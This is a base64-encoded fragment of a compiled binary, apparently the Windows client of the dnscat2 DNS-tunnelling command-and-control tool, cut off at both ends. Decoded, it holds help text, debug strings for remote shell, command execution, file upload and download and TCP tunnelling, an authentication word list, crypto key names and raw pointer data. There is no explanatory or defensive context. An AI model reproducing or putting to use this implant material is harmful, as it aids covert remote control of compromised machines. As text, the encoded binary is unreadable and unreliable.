gdXNlZCBtdWx0aXBsZSB0aW1lcykuCiAtcSAgICAgICAgICAgICAgICAgICAgICBEaXNwbGF5IGxlc3MgZGVidWcgaW5mbyAoY2FuIGJlIHVzZWQgbXVsdGlwbGUgdGltZXMpLgogLS1wYWNrZXQtdHJhY2UgICAgICAgICAgRGlzcGxheSBpbmNvbWluZy9vdXRnb2luZyBkbnNjYXQyIHBhY2tldHMKCkRyaXZlciBvcHRpb25zOgogLS1kbnMgPG9wdGlvbnM+ICAgICAgICAgRW5hYmxlIEROUyBtb2RlIHdpdGggdGhlIGdpdmVuIGRvbWFpbi4KICAgZG9tYWluPTxkb21haW4+ICAgICAgIFRoZSBkb21haW4gdG8gbWFrZSByZXF1ZXN0cyBmb3IuCiAgIGhvc3Q9PGhvc3RuYW1lPiAgICAgICBUaGUgaG9zdCB0byBsaXN0ZW4gb24gKGRlZmF1bHQ6IDAuMC4wLjApLgogICBwb3J0PTxwb3J0PiAgICAgICAgICAgVGhlIHBvcnQgdG8gbGlzdGVuIG9uIChkZWZhdWx0OiA1MykuCiAgIHR5cGU9PHR5cGU+ICAgICAgICAgICBUaGUgdHlwZSBvZiBETlMgcmVxdWVzdHMgdG8gdXNlLCBjYW4gdXNlCiAgICAgICAgICAgICAgICAgICAgICAgICBtdWx0aXBsZSBjb21tYS1zZXBhcmF0ZWQgKG9wdGlvbnM6IFRYVCwgTVgsCiAgICAgICAgICAgICAgICAgICAgICAgICBDTkFNRSwgQSwgQUFBQSkgKGRlZmF1bHQ6IFRYVCxDTkFNRSxNWCkuCiAgIHNlcnZlcj08c2VydmVyPiAgICAgICBUaGUgdXBzdHJlYW0gc2VydmVyIGZvciBtYWtpbmcgRE5TIHJlcXVlc3RzCiAgICAgICAgICAgICAgICAgICAgICAgICAoZGVmYXVsdDogYXV0b2RldGVjdGVkID0gJXMpLgoKRXhhbXBsZXM6CiAuL2Ruc2NhdCAtLWRucyBkb21haW49c2t1bGxzZWNsYWJzLm9yZwogLi9kbnNjYXQgLS1kbnMgZG9tYWluPXNrdWxsc2VjbGFicy5vcmcsc2VydmVyPTguOC44LjgscG9ydD01MwogLi9kbnNjYXQgLS1kbnMgZG9tYWluPXNrdWxsc2VjbGFicy5vcmcscG9ydD01MzUzCiAuL2Ruc2NhdCAtLWRucyBkb21haW49c2t1bGxzZWNsYWJzLm9yZyxwb3J0PTUzLHR5cGU9QSxDTkFNRQoKQnkgZGVmYXVsdCwgYSAtLWRucyBkcml2ZXIgb24gcG9ydCA1MyBpcyBlbmFibGVkIGlmIGEgaG9zdG5hbWUgaXMKcGFzc2VkIG9uIHRoZSBjb21tYW5kbGluZToKCiAuL2Ruc2NhdCBza3VsbHNlY2xhYnMub3JnCgpFUlJPUjogJXMKCgAAACoqIFdBUk5JTkchCgAAAAAqCgAAAAAAACogSXQgbG9va3MgbGlrZSB5b3UncmUgcnVubmluZyBkbnNjYXQyIHdpdGggdGhlIHN5c3RlbSBETlMgc2VydmVyLAoAAAAAACogYW5kIG5vIGRvbWFpbiBuYW1lIQAAACogVGhhdCdzIGNvb2wsIEknbSBub3QgZ29pbmcgdG8gc3RvcCB5b3UsIGJ1dCB0aGUgb2RkcyBhcmUgcmVhbGx5LAoAAAAAAAAAAAAAAAAAKiByZWFsbHkgaGlnaCB0aGF0IHRoaXMgd29uJ3Qgd29yay4gWW91IGVpdGhlciBuZWVkIHRvIHByb3ZpZGUgYQoAAAAAAAAAAAAAAAAAAAAqIGRvbWFpbiB0byB1c2UgRE5TIHJlc29sdXRpb24gKHJlcXVpcmVzIGFuIGF1dGhvcml0YXRpdmUgc2VydmVyKToKAAAAAAAqICAgICBkbnNjYXQgbXlkb21haW4uY29tCgAAAAAAACogT3IgeW91IGhhdmUgdG8gcHJvdmlkZSBhIHNlcnZlciB0byBjb25uZWN0IGRpcmVjdGx5IHRvOgoAAAAAAAAqICAgICBkbnNjYXQgLS1kbnM9c2VydmVyPTEuMi4zLjQscG9ydD01MwoAAAAAAAAAAAAAAAAAACogSSdtIGdvaW5nIHRvIGxldCB0aGlzIGtlZXAgcnVubmluZywgYnV0IG9uY2UgYWdhaW4sIHRoaXMgbGlrZWx5CgAAAAAAACogaXNuJ3Qgd2hhdCB5b3Ugd2FudCEKAENvdWxkbid0IGRldGVybWluZSB0aGUgc3lzdGVtIEROUyBzZXJ2ZXIhIFBsZWFzZSBtYW51YWxseSBzZXQAAAB0aGUgZG5zIHNlcnZlciB3aXRoIC0tZG5zIHNlcnZlcj04LjguOC44AAAAAAAAAABZb3UgY2FuIGFsc28gZml4IHRoaXMgYnkgY3JlYXRpbmcgYSBwcm9wZXIgL2V0Yy9yZXNvbHYuY29uZgoAAAAAQ3JlYXRpbmcgRE5TIGRyaXZlcjoKAAAAIGRvbWFpbiA9ICVzCgAAACBob3N0ICAgPSAlcwoAAAAgcG9ydCAgID0gJXUKAAAAIHR5cGUgICA9ICVzCgAAACBzZXJ2ZXIgPSAlcwoAAAAwLjAuMC4wAFRYVCxDTkFNRSxNWAAAAAA6LAAAZG9tYWluAABob3N0AAAAAHBvcnQAAAAAdHlwZQAAAABzZXJ2ZXIAAAAAAABVbmtub3duIC0tZG5zIG9wdGlvbjogJXMKAAAAAAAAAEVSUk9SIHBhcnNpbmcgLS1kbnM6IGl0IGhhcyB0byBiZSBjb2xvbi1zZXBhcmF0ZWQgbmFtZT12YWx1ZSBwYWlycyEKAAAAAGhlbHAAAAAAaAAAAAAAAAB2ZXJzaW9uAGRlbGF5AAAAc3RlYWR5AABtYXgtcmV0cmFuc21pdHMAcmV0cmFuc21pdC1mb3JldmVyAABzZWNyZXQAAAAAAABuby1lbmNyeXB0aW9uAAAAZXhlYwAAAABlAAAAZG5zAGQAAABxAAAAcGFja2V0LXRyYWNlAAAAAC0taGVscCByZXF1ZXN0ZWQAAAAAAAAAAGRuc2NhdDIgdjAuMDcgKGNsaWVudCkKAGlzbgAAAAAAU2V0dGluZyBkZWxheSBiZXR3ZWVuIHBhY2tldHMgdG8gJWRtcwAAAHRjcAAAAAAAVW5rbm93biBvcHRpb24AAFVucmVjb2duaXplZCBhcmd1bWVudAAAAAAAAAAAAAAASXQgbG9va3MgbGlrZSB5b3UgdXNlZCAtLWRucyBhbmQgYWxzbyBwYXNzZWQgYSBkb21haW4gb24gdGhlIGNvbW1hbmRsaW5lLgoAAAAAAABUaGF0J3Mgbm90IGFsbG93ZWQhIEVpdGhlciB1c2UgJy0tZG5zIGRvbWFpbj14eHgnIG9yIGRvbid0IHVzZSBhIC0tZG5zCgBhcmd1bWVudCEKAAAAAAAAAAAAAAAAAABTdGFydGluZyBETlMgZHJpdmVyIHdpdGhvdXQgYSBkb21haW4hIFRoaXMgd2lsbCBvbmx5IHdvcmsgaWYgeW91CgAAAAAAAABhcmUgZGlyZWN0bHkgY29ubmVjdGluZyB0byB0aGUgZG5zY2F0MiBzZXJ2ZXIuCgBZb3UnbGwgbmVlZCB0byB1c2UgLS1kbnMgc2VydmVyPTxzZXJ2ZXI+IGlmIHlvdSBhcmVuJ3QuCgAAAAAAAAAALi5cZHJpdmVyc1xjb21tYW5kXGNvbW1hbmRfcGFja2V0LmMAAAAAAFVua25vd24gY29tbWFuZF9pZDogMHglMDR4AAAAAAAAT3ZlcmZsb3cgaW4gY29tbWFuZF9wYWNrZXQhAAAAAABTb21ldGhpbmcgd2VudCB2ZXJ5IHdyb25nIHdpdGggdGhlIGJ1ZmZlciBjbGFzczsgdGhlIHdyb25nIG51bWJlciBvZiBieXRlcyB3ZXJlIHJlYWQhAAAAQ09NTUFORF9QSU5HIFtyZXF1ZXN0XSA6OiByZXF1ZXN0X2lkOiAweCUwNHggOjogZGF0YTogJXMKAAAAAAAAAENPTU1BTkRfUElORyBbcmVzcG9uc2VdIDo6IHJlcXVlc3RfaWQ6IDB4JTA0eCA6OiBkYXRhOiAlcwoAAAAAAABDT01NQU5EX1NIRUxMIFtyZXF1ZXN0XSA6OiByZXF1ZXN0X2lkOiAweCUwNHggOjogbmFtZTogJXMKAAAAAAAAAAAAAAAAAABDT01NQU5EX1NIRUxMIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZDogMHglMDR4IDo6IHNlc3Npb25faWQ6IDB4JTA0eAoAAAAAAAAAAAAAAENPTU1BTkRfRVhFQyBbcmVxdWVzdF0gOjogcmVxdWVzdF9pZDogMHglMDR4IDo6IG5hbWU6ICVzIDo6IGNvbW1hbmQ6ICVzCgAAAAAAAAAAQ09NTUFORF9FWEVDIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZDogMHglMDR4IDo6IHNlc3Npb25faWQ6IDB4JTA0eAoAAAAAAAAAAAAAAABDT01NQU5EX0RPV05MT0FEIFtyZXF1ZXN0XSA6OiByZXF1ZXN0X2lkOiAweCUwNHggOjogZmlsZW5hbWU6ICVzCgAAAAAAAAAAAAAAAAAAAENPTU1BTkRfRE9XTkxPQUQgW3Jlc3BvbnNlXSA6OiByZXF1ZXN0X2lkOiAweCUwNHggOjogZGF0YTogMHgleCBieXRlcwoAAAAAAAAAAAAAQ09NTUFORF9VUExPQUQgW3JlcXVlc3RdIDo6IHJlcXVlc3RfaWQ6IDB4JTA0eCA6OiBmaWxlbmFtZTogJXMgOjogZGF0YTogMHgleCBieXRlcwoAAAAAAENPTU1BTkRfVVBMT0FEIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZDogMHglMDR4CgAAAAAAAAAAQ09NTUFORF9TSFVURE9XTiBbcmVxdWVzdF0gOjogcmVxdWVzdF9pZCAweCUwNHgKAAAAAAAAAABDT01NQU5EX1NIVVRET1dOIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZCAweCUwNHgKAAAAAAAAAENPTU1BTkRfREVMQVkgW3JlcXVlc3RdIDo6IHJlcXVlc3RfaWQgMHglMDR4IDo6IGRlbGF5ICVkCgAAAAAAAABDT01NQU5EX0RFTEFZIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZCAweCUwNHgKAABUVU5ORUxfQ09OTkVDVCBbcmVxdWVzdF0gOjogcmVxdWVzdF9pZCAweCUwNHggOjogaG9zdCAlcyA6OiBwb3J0ICVkCgAAAAAAAAAAAAAAAFRVTk5FTF9DT05ORUNUIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZCAweCUwNHggOjogdHVubmVsX2lkICVkCgBUVU5ORUxfREFUQSBbcmVxdWVzdF0gOjogcmVxdWVzdF9pZCAweCUwNHggOjogdHVubmVsX2lkICVkIDo6IGRhdGEgJXpkIGJ5dGVzCgAAAFRVTk5FTF9EQVRBIFtyZXNwb25zZV0gOjogcmVxdWVzdF9pZCAweCUwNHggOjogdGhpcyBzaG91bGRuJ3QgYWN0dWFsbHkgZXhpc3QKAAAAVFVOTkVMX0NMT1NFIFtyZXF1ZXN0XSA6OiByZXF1ZXN0X2lkIDB4JTA0eCA6OiB0dW5uZWxfaWQgJWQgOjogcmVhc29uICVzCgAAAAAAAABUVU5ORUxfQ0xPU0UgW3Jlc3BvbnNlXSA6OiByZXF1ZXN0X2lkIDB4JTA0eCA6OiB0aGlzIHNob3VsZG4ndCBhY3R1YWxseSBleGlzdAoAAENPTU1BTkRfRVJST1IgW3JlcXVlc3RdIDo6IHJlcXVlc3RfaWQ6IDB4JTA0eCA6OiBzdGF0dXM6IDB4JTA0eCA6OiByZWFzb246ICVzCgAAQ09NTUFORF9FUlJPUiBbcmVzcG9uc2VdIDo6IHJlcXVlc3RfaWQ6IDB4JTA0eCA6OiBzdGF0dXM6IDB4JTA0eCA6OiByZWFzb246ICVzCgBHb3QgYSBwaW5nIHJlcXVlc3QhIFJlc3BvbmRpbmchAGNtZC5leGUARXJyb3Igb3BlbmluZyBmaWxlIGZvciByZWFkaW5nAAByYgAAAAAAAGM6XHpcZG5zY2F0Mi1tYXN0ZXJcY2xpZW50XGRyaXZlcnNcY29tbWFuZFxjb21tYW5kc19zdGFuZGFyZC5oAABUaGVyZSB3YXMgYW4gZXJyb3IgcmVhZGluZyB0aGUgZmlsZQB3YgAARXJyb3Igb3BlbmluZyBmaWxlIGZvciB3cml0aW5nAABBbiBlcnJvciByZXNwb25zZSB3YXMgcmV0dXJuZWQ6ICVkIC0+ICVzAAAAAAAAAABBbiBlcnJvciByZXF1ZXN0IHdhcyBzZW50ICh3ZWlyZD8pOiAlZCAtPiAlcwAAAABjOlx6XGRuc2NhdDItbWFzdGVyXGNsaWVudFxkcml2ZXJzXGNvbW1hbmRcY29tbWFuZHNfdHVubmVsLmgAAAAAAAAAAAAAAABbVHVubmVsICVkXSBSZWNlaXZlZCAlemQgYnl0ZXMgb2YgZGF0YSBmcm9tIHNlcnZlcjsgZm9yd2FyZGluZyB0byBjbGllbnQAAAAAAAAAAFtUdW5uZWwgJWRdIGNvbm5lY3Rpb24gdG8gJXM6JWQgY2xvc2VkIGJ5IHRoZSBzZXJ2ZXIhAAAAU2VydmVyIGNsb3NlZCB0aGUgY29ubmVjdGlvbgAAAABbVHVubmVsICVkXSBjb25uZWN0aW9uIHRvICVzOiVkIGNsb3NlZCBiZWNhdXNlIG9mIGVycm9yICVkAAAAAAAAQ29ubmVjdGlvbiBlcnJvcgAAAAAAAAAAW1R1bm5lbCAlZF0gY29ubmVjdGVkIHRvICVzOiVkIQBbVHVubmVsICVkXSBjb25uZWN0aW5nIHRvICVzOiVkLi4uAAAAAAAAVGhlIGRuc2NhdDIgY2xpZW50IGNvdWxkbid0IGNvbm5lY3QgdG8gdGhlIHJlbW90ZSBob3N0IQBDb3VsZG4ndCBmaW5kIHR1bm5lbDogJWQAAAAAAAAAAFtUdW5uZWwgJWRdIFJlY2VpdmVkICV6ZCBieXRlcyBvZiBkYXRhIGZyb20gY2xpZW50OyBmb3J3YXJkaW5nIHRvIHNlcnZlcgAAAAAAAAAAVGhlIHNlcnZlciB0cmllZCB0byBjbG9zZSBhIHR1bm5lbCB0aGF0IHdlIGRvbid0IGtub3cgYWJvdXQ6ICVkAFtUdW5uZWwgJWRdIGNvbm5lY3Rpb24gdG8gJXM6JWQgY2xvc2VkIGJ5IHRoZSBjbGllbnQ6ICVzAAAAAAAAAABHb3QgYSBjb21tYW5kOiAAR290IGEgY29tbWFuZCBwYWNrZXQgdGhhdCB3ZSBkb24ndCBrbm93IGhvdyB0byBoYW5kbGUhCgBOb3QgaW1wbGVtZW50ZWQgeWV0IQAAAABSZXNwb25zZTogAAAAAAAALi5cZHJpdmVyc1xjb21tYW5kXGRyaXZlcl9jb21tYW5kLmMAAAAAAC4uXGRyaXZlcnNcZHJpdmVyLmMAAAAAAFVOS05PV04gRFJJVkVSIFRZUEUhICglZCBpbiBkcml2ZXJfZGVzdHJveSkKAAAAAFVOS05PV04gRFJJVkVSIFRZUEUhICglZCBpbiBkcml2ZXJfY2xvc2UpCgAAAAAAAFVOS05PV04gRFJJVkVSIFRZUEUhICglZCBpbiBkcml2ZXJfZGF0YV9yZWNlaXZlZCkKAAAAAAAAVU5LTk9XTiBEUklWRVIgVFlQRSEgKCVkIGluIGRyaXZlcl9nZXRfb3V0Z29pbmcpCgAAAAAAAAAuLlxkcml2ZXJzXGRyaXZlcl9jb25zb2xlLmMAAAAAAC4uXGRyaXZlcnNcZHJpdmVyX2V4ZWMuYwAAAAAAAAAAZXhlYzogQ291bGRuJ3QgY3JlYXRlIHBpcGUgZm9yIHN0ZGluAAAAAFVucmVjb3ZlcmFibGUgZXJyb3IgaW4gJXMoJWQpOiAlcwoKAAAAAABleGVjOiBDb3VsZG4ndCBjcmVhdGUgcGlwZSBmb3Igc3Rkb3V0AAAAQXR0ZW1wdGluZyB0byBsb2FkIHRoZSBwcm9ncmFtOiAlcwoAAAAAAEZhaWxlZCB0byBjcmVhdGUgdGhlIHByb2Nlc3MAAAAAU3VjY2Vzc2Z1bGx5IGNyZWF0ZWQgdGhlIHByb2Nlc3MhCgoAAAAAAGV4ZWMgZHJpdmVyIHNodXQgZG93bjsga2lsbGluZyBwcm9jZXNzICVkAAAAAAAAAAAAAAAAAAAAUGluZyByZXNwb25zZSByZWNlaXZlZCEgVGhpcyBzZWVtcyBsaWtlIGEgdmFsaWQgZG5zY2F0MiBzZXJ2ZXIuCgAAAAAAAAAAUGluZyByZXNwb25zZSByZWNlaXZlZCwgYnV0IGl0IGRpZG4ndCBjb250YWluIHRoZSByaWdodCBkYXRhIQoAAEV4cGVjdGVkOiAlcwoAAABSZWNlaXZlZDogJXMKAAAAAAAAAAAAAABUaGUgb25seSByZWFzb24gdGhpcyBjYW4gaGFwcGVuIGlzIGlmIHNvbWV0aGluZyBpcyBtZXNzaW5nIHdpdGgKAAAAAAAAAAB5b3VyIEROUyB0cmFmZmljLgoAAAAAAAAuLlxkcml2ZXJzXGRyaXZlcl9waW5nLmMAAAAAAAAAAC4uXGxpYnNcYnVmZmVyLmMAAAAAAAAAAE91dCBvZiBtZW1vcnkuAABQcm9ncmFtIGF0dGVtcHRlZCB0byB1c2UgZGVsZXRlZCBidWZmZXIuAAAAAAAAAABQcm9ncmFtIGF0dGVtcHRlZCB0byB1c2UgYSBkZWxldGVkIGJ1ZmZlci4AAAAAAABQb3NpdGlvbiBpcyBvdXRzaWRlIHRoZSBidWZmZXIAAE92ZXJmbG93LgAAAAAAAABUb28gYmlnIQAAAAAAAAAAUHJvZ3JhbSByZWFkIG9mZiB0aGUgZW5kIG9mIHRoZSBidWZmZXIuAE92ZXJmbG93PwAAAAAAAABPdmVyZmxvdwAAAABBYmF0ZQAAAEFic29yYgAAQWNoZQAAAABBY2lkeQAAAEFjcm9zcwAAQWZ0ZXIAAABBbGlrZQAAAEFtb3VudAAAQW11c2UAAABBbm5veQAAAEFubnVscwAAQXJkZW50AABBc2NvdAAAAEJhaXQAAAAAQmFyb25zAABCYXJyZXQAAEJhc2sAAAAAQmVjdXJsAABCZWZvb2wAAEJlbGwAAAAAQmlmb2xkAABCb2dpZQAAAEJveGVuAAAAQm96bwAAAABCcm9rZQAAAEJ1bGJ5AAAAQnVubnkAAABDYWxtbHkAAENhbmFyeQAAQ2FyZ28AAABDaGlycAAAAENocm9tYQAAQ2xlZnQAAABDb2tlAAAAAENvbHVtbgAAQ29tZWx5AABDb21ldGgAAENvbnZveQAAQ29ybgAAAABDb3VnaAAAAENydXhlcwAAQ3VlZAAAAABEYXJ0ZXIAAERhc2gAAAAARGF0aW5nAABEZWFkbHkAAERlYWYAAAAARGVjYWRlAABEZWVwZW4AAERlcGljdAAARG9tZWQAAABEb3JwZXIAAERyYWZ0cwAARHJpZWQAAABEdWZmAAAAAER1cmlhbgAARWFybHkAAABFYXNpbHkAAEVnZ2FycwAARW1ib3NzAABFbWl0AAAAAEVuY29kZQAARW5udWkAAABFbnZpZWQAAEVzc2F5AAAARXZpdGVzAABFdm9rZQAAAEV4b3RpYwAARmFjaWxlAABGYXRlAAAAAEZlaXN0eQAARmV3ZXN0AABGaWZ0eQAAAEZpbHRoAAAARmluZXIAAABGaXNoZWQAAEZsYWNrcwAARmxhdW50AABGbGVlY3kAAEZsaWVkAAAARm9hbXMAAABGb3hlcwAAAEZyZWVseQAARnJvemVuAABHZW5vbWUAAEdpYmJvbgAAR2lmdHMAAABHaXZpbmcAAEdvbGQAAAAAR29uZQAAAABHb3VnZQAAAEdyb2NlcgAAR3Jvd3MAAABIYWxmAAAAAEhhbmRsZQAASGFyb2xkAABIYXJwAAAAAEhlZGdlcwAASGl0aGVyAABIb2JiaXQAAEhvYmJsZQAASG9vZHMAAABIb29rZWQAAEhvcnJvcgAASG9yc2VkAABIb3VuZAAAAEh1bnMAAAAASWNlcwAAAABJbXBpc2gAAEppYmVyAAAASmlnZ3kAAABLZWxweQAAAEtleW1hbgAAS2hhbgAAAABLaWxsZXIAAEtsdXR6eQAATGFpcgAAAABMYXNoZXMAAExpYmF0ZQAATGltaW5nAABMb25lbHkAAExvb2tzAAAATG9yZHkAAABMdXNoAAAAAE1haWxlcgAATWFwcwAAAABNYXlvAAAAAE1jZ2lsbAAATW9uYQAAAABNb3RpdmUAAE1vdXN5AAAATmVpZ2gAAABOaW5qYXMAAE5vZHVsZQAATnVucwAAAABPYmVzZQAAAE9saXZlAAAAT21lbGV0AABPbWVuAAAAAE90dG8AAAAAT3V0cmFuAABPdXpvAAAAAE93bHMAAAAAUGFwaXNtAABQYXJyb3QAAFBlYWNlAAAAUGVhcmx5AABQZWF0eQAAAFBlZGFsAAAAUGVnZ2VkAABQZXRhbHMAAFBoaWFscwAAUGlhbm9zAABQaWVyY2UAAFBpZ3MAAAAAUGlrZXkAAABQaXRjaAAAAFBsYXRvAAAAUGxheXMAAABQbGlnaHQAAFBvZXRpYwAAUG9rZXIAAABQb2xpdGUAAFBvbnRpYwAAUG9ueQAAAABQb3dlcnMAAFBveGVzAAAAUHJhbXMAAABQdWxwZWQAAFB1cnIAAAAAUHVzaAAAAABRdWludAAAAFJhbmRvbQAAUmFwaWVyAABSYXZlbAAAAFJlYWwAAAAAUmVib2x0AABSZWNvaWwAAFJlZGVhcgAAUmVpbmsAAABSaXBlAAAAAFJpcHJhcAAAUm9nZXIAAABSb3BlcnMAAFJvdmluZwAAUnVtb3IAAABTYW5kZWQAAFNhd2xvZwAAU2F3bWFuAABTY3JpYmUAAFNjcnVmZgAAU2VpdGFuAABTZW5zZQAAAFNoaXJrcwAAU2lwcHkAAABTaXRjb20AAFNsdW1weQAAU29mdHkAAABTb25hcgAAAFNvbm55AAAAU29waGljAABTcGVhcgAAAFNwaWNlZAAAU3Bpa2V5AABTcGluZQAAAFNwb29meQAAU3ByaW5nAABTdGF0aWMAAFN0YXZlZAAAU3RpbHQAAABTdGludHkAAFN0aXJzAAAAU3RvcmVyAABTdG9yeQAAAFN0cm9kZQAAU3R1bXAAAABTdWl0ZWQAAFN1cmZzAAAAU3dhdGNoAABTd3VtAAAAAFRhYmxlcwAAVGFraW5nAABUYXR0b28AAFRlYWwAAAAAVGVldGgAAABUZWxjbwAAAFRpbWVyAAAAVGlucwAAAABUb25pdGUAAFRvcmUAAAAAVG9ydAAAAABUcmllZAAAAFRyaXZpYQAAVHVidWxlAABUdXNrZWQAAFR3aW5zAAAAVHdvcwAAAABVbmJvcm4AAFVuZGFtAAAAVW53cmFwAABVcGN1cmwAAFVwc2VhbAAAVmlzYXMAAABWb2x1bWUAAFdhZGVkAAAAV2FnZXMAAABXYXJlAAAAAFdlYXJzAAAAV2lja2VkAABXaW5mdWwAAFdpc2VseQAAV2lzcAAAAABZZXJiYQAAAFplc3RlcgAAWm9uZXIAAABab290aWMAAAAAAAAuLlxsaWJzXGNyeXB0b1xlbmNyeXB0b3IuYwAAAAAAAGNsaWVudF93cml0ZV9rZXkAAAAAAAAAAGNsaWVudF9tYWNfa2V5AABzZXJ2ZXJfd3JpdGVfa2V5AAAAAAAAAABzZXJ2ZXJfbWFjX2tleQAAY2xpZW50AABteV9wcml2YXRlX2tleQAAbXlfcHVibGljX2tleQAAAHRoZWlyX3B1YmxpY19rZXkAAAAAAAAAAHNoYXJlZF9zZWNyZXQAAABteV9hdXRoZW50aWNhdG9yAAAAAAAAAAB0aGVpcl9hdXRoZW50aWNhdG9yAAAAAABteV93cml0ZV9rZXkAAAAAbXlfbWFjX2tleQAAAAAAAHRoZWlyX3dyaXRlX2tleQB0aGVpcl9tYWNfa2V5AAAAYXV0aHN0cmluZwAAJXMgAHzuAkABAAAAhO4CQAEAAACM7gJAAQAAAJTuAkABAAAAnO4CQAEAAACk7gJAAQAAAKzuAkABAAAAtO4CQAEAAAC87gJAAQAAAMTuAkABAAAAzO4CQAEAAADU7gJAAQAAANzuAkABAAAA5O4CQAEAAADs7gJAAQAAAPTuAkABAAAA/O4CQAEAAAAE7wJAAQAAAAzvAkABAAAAFO8CQAEAAAAc7wJAAQAAACTvAkABAAAALO8CQAEAAAA07wJAAQAAADzvAkABAAAARO8CQAEAAABM7wJAAQAAAFTvAkABAAAAXO8CQAEAAABk7wJAAQAAAGzvAkABAAAAdO8CQAEAAAB87wJAAQAAAITvAkABAAAAjO8CQAEAAACU7wJAAQAAAJzvAkABAAAApO8CQAEAAACs7wJAAQAAALTvAkABAAAAvO8CQAEAAADE7wJAAQAAAMzvAkABAAAA1O8CQAEAAADc7wJAAQAAAOTvAkABAAAA7O8CQAEAAAD07wJAAQAAAPzvAkABAAAABPACQAEAAAAM8AJAAQAAABTwAkABAAAAHPACQAEAAAAk8AJAAQAAACzwAkABAAAANPACQAEAAAA88AJAAQAAAETwAkABAAAATPACQAEAAABU8AJAAQAAAFzwAkABAAAAZPACQAEAAABs8AJAAQAAAHTwAkABAAAAfPACQAEAAACE8AJAAQAAAIzwAkABAAAAlPACQAEAAACc8AJAAQAAAKTwAkABAAAArPACQAEAAAC08AJAAQAAALzwAkABAAAAxPACQAEAAADM8AJAAQAAANTwAkABAAAA3PACQAEAAADk8AJAAQAAAOzwAkABAAAA9PACQAEAAAD88AJAAQAAAATxAkABAAAADPECQAEAAAAU8QJAAQAAABzxAkABAAAAJPECQAEAAAAs8QJAAQAAADTxAkABAAAAPPECQAEAAABE8QJAAQAAAEzxAkABAAAAVPECQAEAAABc8QJAAQAAAGTxAkABAAAAbPECQAEAAAB08QJAAQAAAHzxAkABAAAAhPECQAEAAACM8QJAAQAAAJTxAkABAAAAnPECQAEAAACk8QJAAQAAAKzxAkABAAAAtPECQAEAAAC88QJAAQAAAMTxAkABAAAAzPECQAEAAADU8QJAAQAAANzxAkABAAAA5PECQAEAAADs8QJAAQAAAPTxAkABAAAA/PECQAEAAAAE8gJAAQAAAAzyAkABAAAAFPICQAEAAAAc8gJAAQAAACTyAkABAAAALPICQAEAAAA08gJAAQAAADzyAkABAAAARPICQAEAAABM8gJAAQAAAFTyAkABAAAAXPICQAEAAABk8gJAAQAAAGzyAkABAAAAdPICQAEAAAB88gJAAQAAAITyAkABAAAAjPICQAEAAACU8gJAAQAAAJzyAkABAAAApPICQAEAAACs8gJAAQAAALTyAkABAAAAvPICQAEAAADE8gJAAQAAAMzyAkABAAAA1PICQAEAAADc8gJAAQAAAOTyAkABAAAA7PICQAEAAAD08gJAAQAAAPzyAkABAAAABPMCQAEAAAAM8wJAAQAAABTzAkABAAAAHPMCQAEAAAAk8wJAAQAAACzzAkABAAAANPMCQAEAAAA88wJAAQAAAETzAkABAAAATPMCQAEAAABU8wJAAQAAAFzzAkABAAAAZPMCQAEAAABs8wJAAQAAAHTzAkABAAAAfPMCQAEAAACE8wJAAQAAAIzzAkABAAAAlPMCQAEAAACc8wJAAQAAAKTzAkABAAAArPMCQAEAAAC08wJAAQAAALzzAkABAAAAxPMCQAEAAADM8wJAAQAAANTzAkABAAAA3PMCQAEAAADk8wJAAQAAAOzzAkABAAAA9PMCQAEAAAD88wJAAQAAAAT0AkABAAAADPQCQAEAAAAU9AJAAQAAABz0AkABAAAAJPQCQAEAAAAs9AJAAQAAADT0AkABAAAAPPQCQAEAAABE9AJAAQAAAEz0AkABAAAAVPQCQAEAAABc9AJAAQAAAGT0AkABAAAAbPQCQAEAAAB09AJAAQAAAHz0AkABAAAAhPQCQAEAAACM9AJAAQAAAJT0AkABAAAAnPQCQAEAAACk9AJAAQAAAKz0AkABAAAAtPQCQAEAAAC89AJAAQAAAMT0AkABAAAAzPQCQAEAAADU9AJAAQAAANz0AkABAAAA5PQCQAEAAADs9AJAAQAAAPT0AkABAAAA/PQCQAEAAAAE9QJAAQAAAAz1AkABAAAAFPUCQAEAAAAc9QJAAQAAACT1AkABAAAALPUCQAEAAAA09QJAAQAAADz1AkABAAAARPUCQAEAAABM9QJAAQAAAFT1AkABAAAAXPUCQAEAAABk9QJAAQAAAGz1AkABAAAAdPUCQAEAAAB89QJAAQAAAIT1AkABAAAAjPUCQAEAAACU9QJAAQAAAJz1AkABAAAApPUCQAEAAACs9QJAAQAAALT1AkABAAAAvPUCQAEAAADE9QJAAQAAAMz1AkABAAAA1PUCQAEAAADc9QJAAQAAAOT1AkABAAAA7PUCQAEAAAD09QJAAQAAAPz1AkABAAAABPYCQAEAAAAM9gJAAQAAABT2AkABAAAAHPYCQAEAAAAk9gJAAQAAACz2AkABAAAANPYCQAEAAAA89gJAAQAAAET2AkABAAAATPYCQAEAAABU9gJAAQAAAFz2AkABAAAAZPYCQAEAAABs9gJAAQAAAHT2AkABAAAABCAAAQAAAAD///////////////8AAAAAAAAAAAAAAAABAAAA/////1ElY/zCyrnzhJ4Xp6365rz//////////wAAAAD/////lsKY2EU5ofSgM+stgX0Dd/JApGPl5rz4R0Is4fLRF2v1Ub83aEC2y85eMWtXM84rFp4PfErr546bfxr+4kLjT0tg0ic+PM479rBTzLAGHWW8hph2Vb3rs+eTOqrYNcZakHMAQAEAAACcdgBAAQAAAPR1AEABAAAAwIAAQAEAAAAobABAAQAAAAQgAAEAAAAAL/z///7///////////////////////////////////9BQTbQjF7SvzugSK/m3K66/v///////////////////5gX+BZbgfJZ2SjOLdv8mwIHC4fOlWKgVay73Pl+Zr55uNQQ+4/QR5wZVIWmSLQX/agIEQ78+6RdZcSjJnfaOkgHAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMyDAEABAAAAnHYAQAEAAABshQBAAQAAAMyFAEABAAAAAAAAAAAAAAAEHOAAAAAAAAEAAAAAAAAAAAAAAP////////////////////8AAAAAPSpcXEUp3RM+8Ljgohb//////////////////wAAAAAhHVwR1oAyNCIRwlbTwQNKuZATMn+/tGu9DA63AAAAADR+AIWZgdVEZEcHWqB1Q83m3yJM+yP3tYhjN70AAAAAtP9VI0M5Cye62L/Xt7BEUFYyQfWrswQMhQoFtAAAAACQcwBAAQAAAMB9AEABAAAA9HUAQAEAAAAEfwBAAQAAAAAAAAAAAAAAAxjAAAAAAAD///////////7///////////////////8AAAAAAAAAADEo0rSxyW